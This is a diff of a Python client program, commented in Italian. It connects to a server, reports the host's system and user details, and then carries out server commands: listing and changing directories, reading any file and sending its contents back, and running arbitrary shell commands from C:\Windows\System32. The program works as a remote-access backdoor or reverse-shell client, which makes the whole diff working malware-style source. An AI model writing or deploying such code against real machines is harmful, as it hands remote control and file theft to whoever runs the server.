@@ -7,25 +7,28 @@ import subprocess
 import time
 
 checkConnectionPort = 23000
-serverName = 'localhost'                        #prev: 192.168.86.32 \\ indirizzo IP a cui connettersi
+# indirizzo IP a cui connettersi
+serverName = 'localhost'
 # usata solo per pairing iniziale, il S.O. assegna poi una porta
 serverPort = 6677
+
 
 def checkConnection():
     checkSocket = socket(AF_INET, SOCK_STREAM)
     checkSocket.connect((serverName, checkConnectionPort))
     checkSocket.settimeout(3)
     while True:
-        message = checkSocket.recv(1).decode()
-        if message != '0':
-            raise Exception("Opps!!!")
-        checkSocket.send('0'.encode())
-        time.sleep(5)
+        try:
+            checkSocket.recv(1).decode()
+            checkSocket.send('0'.encode())
+            time.sleep(2)
+        except Exception as e:
+            print(e)
+            checkSocket.close()
+            raise e
 
 
 clientSocket = socket(AF_INET, SOCK_STREAM)
-
-
 while True:
     try:
         clientSocket.connect((serverName, serverPort))
@@ -37,10 +40,17 @@ while True:
 # dichiarato il thread che ha come target la funzione checkConnection e come argomento da passare connectionSocket
 threadCheckConnection = threading.Thread(target=checkConnection, args=())
 threadCheckConnection.start()
-
-info = 'Uname:	' + ''.join(platform.uname()) + '\n Machine:	' + platform.machine() + '\n User:	' + os.getlogin() + \
-       '\n RAM:	' + str(int(psutil.virtual_memory().total / 1048576)) + 'MB\n Disk Usage:	' \
-       + str(psutil.disk_usage('/').percent) + ' Full%\n Disk File System:	' + str(psutil.disk_partitions())
+node = platform.node()
+version = platform.version()
+processor = platform.processor()
+info = 'System: ' + platform.system()
+info += '\nOS Version: ' + version
+info += '\nMachine name: ' + node
+info += '\nProcessor: ' + processor
+info += '\nUser: ' + os.getlogin()
+info += '\nRAM: ' + str(int(psutil.virtual_memory().total / 1048576)) + 'MB'
+info += '\nMain Disk Usage: ' + str(psutil.disk_usage('/').percent) + '% Full'
+info += '\nDisk File System: ' + str(psutil.disk_partitions())
 
 clientSocket.send(info.encode())
 ack = clientSocket.recv(1024).decode()
@@ -51,7 +61,7 @@ while command != 'exit':
         path = os.getcwd()
         clientSocket.send(path.encode())
         clientSocket.send(str(os.listdir(path)).encode())
-    if command.startswith('1'):
+    elif command.startswith('1'):
         try:
             if command[1:] != '..':
                 os.chdir(command[1:])
@@ -62,14 +72,18 @@ while command != 'exit':
         except OSError:
             path = "Directory inesistente."
             clientSocket.send(path.encode())
-    if command.startswith('0'):
-        print(command)
-        file = open(command[1:], "r", encoding='utf-8')
-        data = file.read()
-        clientSocket.send(data.encode())
-        file.close()
-    if command != 'ls' and not command.startswith('0') and not command.startswith('1'):
-        cmd = "cd C:\Windows\System32 && "
+    elif command.startswith('0'):
+        try:
+            file = open(command[1:], "rb")
+            data = file.read()
+            clientSocket.send('1'.encode())
+            clientSocket.send(data)
+            file.close()
+        except Exception as e:
+            print(e)
+            clientSocket.send('0'.encode())
+    else:
+        cmd = "cd C:\\Windows\\System32 && "
         proc = subprocess.Popen(cmd+command, stdout=subprocess.PIPE, shell=True)
         out, err = proc.communicate()
         if out == b'':
